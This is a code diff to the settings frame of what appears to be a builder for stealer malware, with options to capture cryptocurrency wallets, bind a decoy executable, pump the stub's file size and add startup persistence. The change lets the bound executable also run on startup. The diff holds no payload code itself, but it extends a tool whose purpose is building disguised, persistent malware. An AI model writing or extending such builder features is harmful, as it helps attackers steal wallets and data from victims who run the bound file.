@@ -139,6 +139,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureWalletsVar = ctk.BooleanVar(self)
 		
 		self.boundExePath = ""
+		self.boundExeRunOnStartup = False
 		self.iconBytes = ""
 
 		self.OutputAsExe = True
@@ -286,9 +287,12 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			if os.path.isfile(filePath):
 				self.boundExePath = filePath
 				self.bindExeButtonControl.configure(text= UNBIND)
+				if messagebox.askyesno("Bind Executable", "Do you want this bound executable to run on startup as well? (Only works if `Put On Startup` option is enabled)"):
+					self.boundExeRunOnStartup = True
 		
 		elif buttonText == UNBIND:
 			self.boundExePath = ""
+			self.boundExeRunOnStartup = False
 			self.bindExeButtonControl.configure(text= BIND)
 	
 	def selectIconButtonControl_Callback(self) -> None:
@@ -445,6 +449,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				"consoleMode" : self.ConsoleMode,
 				"debug" : self.ConsoleMode == 2,
 				"pumpedStubSize" : self.pumpLimit,
+				"boundFileRunOnStartup" : self.boundExeRunOnStartup,
     		},
     
     		"modules" : {
